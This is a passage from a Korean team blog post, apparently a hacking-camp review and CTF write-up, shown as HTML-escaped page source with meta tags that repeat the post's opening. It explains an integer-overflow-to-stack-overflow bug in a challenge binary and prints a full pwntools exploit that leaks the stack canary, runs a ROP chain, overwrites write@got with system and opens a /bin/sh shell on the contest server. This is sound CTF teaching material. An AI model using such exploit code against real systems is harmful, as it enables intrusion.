&amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; amount&amp;#xB97C; &lt;code&gt;%d&lt;/code&gt;&amp;#xB85C; &amp;#xC785;&amp;#xB825; &amp;#xBC1B;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC74C;&amp;#xC218;&amp;#xB97C; &amp;#xC785;&amp;#xB825;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; int &amp;#xC790;&amp;#xB8CC;&amp;#xD615;&amp;#xC758; &amp;#xCD5C;&amp;#xC19F;&amp;#xAC12;&amp;#xC744; &amp;#xC785;&amp;#xB825;&amp;#xD558;&amp;#xBA74; -1&amp;#xB85C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xB41C; &lt;code&gt;v2&lt;/code&gt;&amp;#xC640; &amp;#xB354;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; Integer Overflow&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD574; &lt;code&gt;v2&lt;/code&gt;&amp;#xB294; int &amp;#xC790;&amp;#xB8CC;&amp;#xD615;&amp;#xC758; &amp;#xCD5C;&amp;#xB313;&amp;#xAC12;&amp;#xC774; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &lt;code&gt;BreakHorcrux&lt;/code&gt;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;ssize_t&lt;/span&gt; __fastcall &lt;span class=&#34;hljs-title&#34;&gt;BreakHorcrux&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; potion_cnt)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  __int64 buf[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;]; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+10h] [rbp-30h] BYREF&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64 canary; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+38h] [rbp-8h]&lt;/span&gt;

  canary = __readfsqword(&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;u);
  buf[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  buf[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  buf[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  buf[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  buf[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0L&lt;/span&gt;L;
  write(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;First Chance: &amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xE&lt;/span&gt;uLL);
  read(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, buf, potion_cnt);
  &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s is not a password.\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)buf);
  write(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Second Chance: &amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xF&lt;/span&gt;uLL);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; read(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, buf, potion_cnt);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;DrinkPotion&lt;/code&gt;&amp;#xC758; Integer Overflow&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;potion_cnt&lt;/code&gt;&amp;#xC5D0; int &amp;#xCD5C;&amp;#xB313;&amp;#xAC12;&amp;#xC744; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xBA74; &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; 40&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xC778; &lt;code&gt;buf&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; stack bof&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;read&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;buf&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;potion_cnt&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &amp;#xCD1D; &amp;#xB450; &amp;#xBC88; &amp;#xC785;&amp;#xB825;&amp;#xC744; &amp;#xBC1B;&amp;#xB294;&amp;#xB370; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC785;&amp;#xB825;&amp;#xC740; &lt;code&gt;buf&lt;/code&gt;&amp;#xB97C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xB85C; &amp;#xCD9C;&amp;#xB825;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC785;&amp;#xB825;&amp;#xC5D0;&amp;#xC11C; &amp;#xCE74;&amp;#xB098;&amp;#xB9AC;&amp;#xC758; &amp;#xCCAB; &amp;#xB110; &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xB2E4;&amp;#xB978; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xB36E;&amp;#xC5B4; &amp;#xCE74;&amp;#xB098;&amp;#xB9AC;&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xB0B4;&amp;#xACE0; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC785;&amp;#xB825;&amp;#xC5D0;&amp;#xC11C; &amp;#xCE74;&amp;#xB098;&amp;#xB9AC;&amp;#xAC00; &amp;#xD3EC;&amp;#xD568;&amp;#xB41C; ROP &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC0BD;&amp;#xC785;&amp;#xD574; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;Exploit&#34;&gt;&lt;a href=&#34;#Exploit&#34; class=&#34;headerlink&#34; title=&#34;Exploit&#34;&gt;&lt;/a&gt;Exploit&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *

context.log_level = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;debug&amp;apos;&lt;/span&gt;

elf = ELF(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./horcrux2&amp;quot;&lt;/span&gt;)
libc = ELF(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./libc-2.27.so&amp;quot;&lt;/span&gt;)
&lt;span class=&#34;hljs-comment&#34;&gt;#libc = elf.libc&lt;/span&gt;

&lt;span class=&#34;hljs-comment&#34;&gt;#p = process(&amp;quot;./horcrux2&amp;quot;)&lt;/span&gt;
p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;15.165.100.234&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;32859&lt;/span&gt;)

int_overflow = &lt;span class=&#34;hljs-number&#34;&gt;-2147483648&lt;/span&gt;

p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;&amp;gt;&amp;gt;&amp;quot;&lt;/span&gt;, str(int_overflow).encode())

p.sendline(cyclic(&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;, n=&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;))

p.recvuntil(cyclic(&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;, n=&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)+&lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;\n&amp;apos;&lt;/span&gt;)

canary = u64(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;\x00&amp;apos;&lt;/span&gt;+p.recv(&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;))

print(hex(canary))

payload = cyclic(&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;, n=&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + p64(canary) + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;

&lt;span class=&#34;hljs-comment&#34;&gt;#ROP&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;#gadgets&lt;/span&gt;
pop_rdi = p64(&lt;span class=&#34;hljs-number&#34;&gt;0x0000000000400ab3&lt;/span&gt;)
pop_rsi_r15 = p64(&lt;span class=&#34;hljs-number&#34;&gt;0x0000000000400ab1&lt;/span&gt;)
pop_rdx = p64(&lt;span class=&#34;hljs-number&#34;&gt;0x00000000004008af&lt;/span&gt;)
ret = p64(&lt;span class=&#34;hljs-number&#34;&gt;0x0000000000400696&lt;/span&gt;)

payload += pop_rdi + p64(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) + pop_rsi_r15 + p64(elf.got[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;]) + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rdx + p64(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + p64(elf.plt[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;]) &lt;span class=&#34;hljs-comment&#34;&gt;# write(1, write@got, 8)&lt;/span&gt;
payload += pop_rdi + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rsi_r15 + p64(elf.got[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;]) + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rdx + p64(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + p64(elf.plt[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;read&amp;apos;&lt;/span&gt;]) &lt;span class=&#34;hljs-comment&#34;&gt;# read(0, write@got, 8)&lt;/span&gt;
payload += pop_rdi + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rsi_r15 + p64(elf.bss()) + p64(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) + pop_rdx + p64(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) + p64(elf.plt[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;read&amp;apos;&lt;/span&gt;]) &lt;span class=&#34;hljs-comment&#34;&gt;# read(0, bss, 8)&lt;/span&gt;
payload += pop_rdi + p64(elf.bss()) + ret + p64(elf.plt[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;])&lt;span class=&#34;hljs-comment&#34;&gt;# system(&amp;quot;/bin/sh&amp;quot;)&lt;/span&gt;

p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;Second Chance: &amp;apos;&lt;/span&gt;)
p.send(payload)

libc_base = u64(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)) - libc.sym[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;] &lt;span class=&#34;hljs-comment&#34;&gt;#write&lt;/span&gt;

p.send(p64(libc_base + libc.sym[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;system&amp;apos;&lt;/span&gt;]))
p.send(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;)

p.interactive()&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34;&gt;&lt;a href=&#34;#&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34;&gt;&lt;/a&gt;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&lt;/h1&gt;&lt;p&gt;&amp;#xC138; &amp;#xBA85; &amp;#xBAA8;&amp;#xB450; &amp;#xCC98;&amp;#xC74C;&amp;#xC73C;&amp;#xB85C; &amp;#xCC38;&amp;#xC5EC;&amp;#xD558;&amp;#xB294; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC600;&amp;#xB294;&amp;#xB370;, &amp;#xCCAB; &amp;#xCC38;&amp;#xC5EC;&amp;#xC784;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC5EC;&amp;#xB7EC; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC5D0; &amp;#xC801;&amp;#xADF9;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xCC38;&amp;#xC5EC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xBC30;&amp;#xB824;&amp;#xD574;&amp;#xC8FC;&amp;#xC2E0; &amp;#xB178;&amp;#xB825;&amp;#xB4E4;&amp;#xC774; &amp;#xB290;&amp;#xAEF4;&amp;#xC838; &amp;#xC990;&amp;#xAC81;&amp;#xAC8C; &amp;#xCC38;&amp;#xC5EC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC;&amp;#xC6D0;&amp;#xB4E4;&amp;#xC774;&amp;#xB098; &amp;#xBCF4;&amp;#xC548;&amp;#xD558;&amp;#xB294; &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0; &amp;#xAF2D; &amp;#xCC38;&amp;#xC5EC;&amp;#xD574;&amp;#xBCF4;&amp;#xB77C;&amp;#xACE0; &amp;#xC801;&amp;#xADF9;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xCD94;&amp;#xCC9C;&amp;#xD558;&amp;#xACE0; &amp;#xC2F6;&amp;#xB124;&amp;#xC694; :)&lt;/p&gt;
&lt;p&gt;&amp;#xC88B;&amp;#xC740; &amp;#xAD50;&amp;#xB958;&amp;#xC758; &amp;#xC790;&amp;#xB9AC;&amp;#xB97C; &amp;#xB9C8;&amp;#xB828;&amp;#xD574;&amp;#xC8FC;&amp;#xC2E0; PoC Security, Demon&amp;#xD300;, SISS, &amp;#xD6C4;&amp;#xC6D0;&amp;#xC0AC; &amp;#xBC0F; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790; &amp;#xBD84;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xAC10;&amp;#xC0AC;&amp;#xC758; &amp;#xB9D0;&amp;#xC500;&amp;#xC744; &amp;#xB4DC;&amp;#xB9BD;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/picture1.jpg&#34; alt=&#34;picture1&#34;&gt;&lt;/p&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Daily-Life] 27  Review&amp;Write-Up - hackyboiz">
  <meta property="og:description" content="&lt;h1 id=&#34;&amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA70;&#34;&gt;&lt;a href=&#34;#&amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA70;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA70;&#34;&gt;&lt;/a&gt;&amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA70;&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! sstf write-up&amp;#xC5D0; &amp;#xC774;&amp;#xC5B4; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504; &amp;#xB9AC;&amp;#xBDF0; &amp;#xAE00;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC654;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xB2EC; 8&amp;#xC6D4; 26, 27&amp;#xC77C; &amp;#xC8FC;&amp;#xB9D0; &amp;#xB3D9;&amp;#xC548; &amp;#xD574;&amp;#xD0A4;&amp;#xBCF4;&amp;#xC774;&amp;#xC988; &amp;#xD300;&amp;#xC6D0; syru, pwndorei&amp;#xC640; &amp;#xD568;&amp;#xAED8; 27&amp;#xD68C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0; &amp;#xCC38;&amp;#xC5EC;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xBD84;&amp;#xC57C;&amp;#xC5D0;&amp;#xC11C; &amp;#xD65C;&amp;#xB3D9;&amp;#xD558;&amp;#xB294; &amp;#xBCF4;&amp;#xC548;&amp;#xC778;&amp;#xB4E4;&amp;#xC758; &amp;#xBC1C;&amp;#xD45C;&amp;#xB97C; &amp;#xB4E3;&amp;#xACE0;, &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0;&amp;#xC11C; &amp;#xC900;&amp;#xBE44;&amp;#xD574;&amp;#xC8FC;&amp;#xC2E0; CTF&amp;#xB3C4; &amp;#xC990;&amp;#xAC81;&amp;#xAC8C; &amp;#xCC38;&amp;#xC5EC;&amp;#xD588;&amp;#xB294;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD300;&amp;#xC744; &amp;#xB098;&amp;#xB204;&amp;#xC5B4; CTF&amp;#xB3C4; &amp;#xC9C4;&amp;#xD589;&amp;#xD588;&amp;#xB294;&amp;#xB370;, &amp;#xC544;&amp;#xC27D;&amp;#xAC8C;&amp;#xB3C4; &amp;#xC11C;&amp;#xB85C; &amp;#xB2E4;&amp;#xB978; &amp;#xD300;&amp;#xC73C;&amp;#xB85C; &amp;#xB098;&amp;#xB258;&amp;#xC5B4; &amp;#xAC19;&amp;#xC774; &amp;#xD480;&amp;#xC9C4; &amp;#xBABB;&amp;#xD588;&amp;#xC9C0;&amp;#xB9CC; &amp;#xAC01;&amp;#xC790;&amp;#xC758; &amp;#xD300;&amp;#xC5D0;&amp;#xC11C; &amp;#xC990;&amp;#xAC81;&amp;#xAC8C; &amp;#xBB38;&amp;#xC81C;&amp;#xB97C; &amp;#xD480;&amp;#xC5C8;&amp;#xB2E4;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD6C4;&amp;#xAE30;&amp;#xC640; &amp;#xD568;&amp;#xAED8; Write-Up&amp;#xB97C; &amp;#xC815;&amp;#xB9AC;&amp;#xD574;&amp;#xBCF4;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;Review&#34;&gt;&lt;a href=&#34;#Review&#34; class=&#34;headerlink&#34; title=&#34;Review&#34;&gt;&lt;/a&gt;Review&lt;/h1&gt;&lt;h2 id=&#34;L0ch&#34;&gt;&lt;a href=&#34;#L0ch&#34; class=&#34;headerlink&#34; title=&#34;L0ch&#34;&gt;&lt;/a&gt;L0ch&lt;/h2&gt;&lt;p&gt;&amp;#xC5BC;&amp;#xB9C8; &amp;#xC804; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790; &amp;#xBAA8;&amp;#xC9D1;&amp;#xC5D0; Hyper-V &amp;#xAD00;&amp;#xB828; &amp;#xC5F0;&amp;#xAD6C;&amp;#xB97C; &amp;#xC8FC;&amp;#xC81C;&amp;#xB85C; &amp;#xC81C;&amp;#xCD9C;&amp;#xD55C; &amp;#xC81C; &amp;#xC544;&amp;#xC820;&amp;#xB2E4;&amp;#xAC00; &amp;#xC120;&amp;#xC815;&amp;#xB418;&amp;#xC5B4; &amp;#xBC1C;&amp;#xD45C;&amp;#xB9CC; &amp;#xD574;&amp;#xC57C;&amp;#xC9C0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD588;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7F0;&amp;#xB370; &amp;#xD300;&amp;#xC6D0;&amp;#xB4E4;&amp;#xACFC; &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC; &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4;&amp;#xC774; &amp;#xB2E4;&amp;#xB4E4; &amp;#xCC38;&amp;#xC5EC;&amp;#xD55C;&amp;#xB2E4;&amp;#xAE38;&amp;#xB798; &amp;#xCDE8;&amp;#xC900;&amp;#xC5D0; &amp;#xD55C;&amp;#xCC3D;&amp;#xC778; &amp;#xB54C;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC774;&amp;#xB7F0; &amp;#xAE30;&amp;#xD68C;&amp;#xB97C; &amp;#xB193;&amp;#xCE60; &amp;#xC218; &amp;#xC5C6;&amp;#xC5B4; &amp;#xCC38;&amp;#xAC00;&amp;#xC790;&amp;#xB85C;&amp;#xB3C4; &amp;#xCC38;&amp;#xC5EC;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xB124;&amp;#xC694;. &amp;#xB355;&amp;#xBD84;&amp;#xC5D0; &lt;del&gt;&amp;#xC774;&amp;#xC81C;&amp;#xB294; &amp;#xAC00;&amp;#xBB3C;&amp;#xAC00;&amp;#xBB3C;&amp;#xD55C;..&lt;/del&gt;  &amp;#xACE0;&amp;#xB4F1;&amp;#xD559;&amp;#xC0DD; &amp;#xC2DC;&amp;#xC808; &amp;#xC218;&amp;#xD559;&amp;#xC5EC;&amp;#xD589; &amp;#xAE30;&amp;#xBD84;&amp;#xB3C4; &amp;#xB290;&amp;#xB084; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0;, &amp;#xD574;&amp;#xD0B9;&amp;#xC744; &amp;#xCC98;&amp;#xC74C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; &amp;#xC0C8;&amp;#xB0B4;&amp;#xAE30; &amp;#xBD84;&amp;#xB4E4;&amp;#xBD80;&amp;#xD130; &amp;#xC5C4;&amp;#xCCAD;&amp;#xB09C; &amp;#xC2E4;&amp;#xB825;&amp;#xC790; &amp;#xBD84;&amp;#xB4E4;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC5EC;&amp;#xB7EC; &amp;#xC0AC;&amp;#xB78C;&amp;#xB4E4;&amp;#xC744; &amp;#xB9CC;&amp;#xB098; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC5D0; &amp;#xC790;&amp;#xADF9;&amp;#xC744; &amp;#xBC1B;&amp;#xB294; &amp;#xACC4;&amp;#xAE30;&amp;#xAC00; &amp;#xB41C; &amp;#xC88B;&amp;#xC740; &amp;#xACBD;&amp;#xD5D8;&amp;#xC774;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;h2 id=&#34;syru&#34;&gt;&lt;a href=&#34;#syru&#34; class=&#34;headerlink&#34; title=&#34;syru&#34;&gt;&lt;/a&gt;syru&lt;/h2&gt;&lt;p&gt;&amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xB85C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD588;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC694;&amp;#xBC88;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC2E4;&amp;#xD328;&amp;#xD558;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB098;&amp;#xC911;&amp;#xC5D0; &amp;#xBC1C;&amp;#xD45C; &amp;#xB77C;&amp;#xC778;&amp;#xC5C5;&amp;#xC744; &amp;#xBCF4;&amp;#xB2C8; &amp;#xC81C;&amp;#xAC00; &amp;#xC591;&amp;#xBCF4;&amp;#xD574;&amp;#xC57C; &amp;#xD588;&amp;#xB358; &amp;#xAD6D;&amp;#xB0B4;&amp;#xC678;&amp;#xB85C; &amp;#xC778;&amp;#xC815;&amp;#xBC1B;&amp;#xB294; &amp;#xD654;&amp;#xB824;&amp;#xD55C; &amp;#xBCF4;&amp;#xC548;&amp;#xC778; &amp;#xB4E4;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; &amp;#xC6B0;&amp;#xB9AC; &amp;#xD300;&amp;#xC7A5;&amp;#xC758; &amp;#xBC1C;&amp;#xD45C;&amp;#xB3C4; &amp;#xB4E4;&amp;#xC744; &amp;#xACB8; &amp;#xCC38;&amp;#xC5EC;&amp;#xD574;&amp;#xBCF4;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC624;&amp;#xC790;&amp;#xB9C8;&amp;#xC790; &amp;#xB180;&amp;#xB790;&amp;#xB358; &amp;#xAC83;&amp;#xC740; &amp;#xC815;&amp;#xB9D0; &amp;#xC5B4;&amp;#xB9B0; &amp;#xCE5C;&amp;#xAD6C;&amp;#xB4E4;&amp;#xC774; &amp;#xC77C;&amp;#xCC0D;&amp;#xBD80;&amp;#xD130; &amp;#xBCF4;&amp;#xC548;&amp;#xC758; &amp;#xAD00;&amp;#xC2EC;&amp;#xC774; &amp;#xB9CE;&amp;#xB354;&amp;#xB77C;&amp;#xACE0;&amp;#xC694;. &amp;#xC800;&amp;#xB294; &amp;#xC911;&amp;#xD559;&amp;#xAD50; &amp;#xB098;&amp;#xC774; &amp;#xB54C; &amp;#xCE5C;&amp;#xAD6C;&amp;#xB4E4;&amp;#xC774;&amp;#xB791; &amp;#xC720;x&amp;#xC655;&amp;#xCE74;&amp;#xB4DC;&amp;#xB97C; &amp;#xD558;&amp;#xBA70; &amp;#xC9C0;&amp;#xB0C8;&amp;#xB358; &amp;#xAC83; &amp;#xAC19;&amp;#xC740;&amp;#xB370; &amp;#xC5EC;&amp;#xB7EC; &amp;#xB300;&amp;#xD68C;&amp;#xB3C4; &amp;#xB098;&amp;#xAC00;&amp;#xACE0; &amp;#xD63C;&amp;#xC790; &amp;#xBCF4;&amp;#xC548; &amp;#xC5F0;&amp;#xAD6C;&amp;#xB3C4; &amp;#xC9C4;&amp;#xD589;&amp;#xD588;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xB4E3;&amp;#xACE0; &amp;#xB300;&amp;#xB2E8;&amp;#xD558;&amp;#xB2E4;&amp;#xACE0; &amp;#xB290;&amp;#xAF08;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
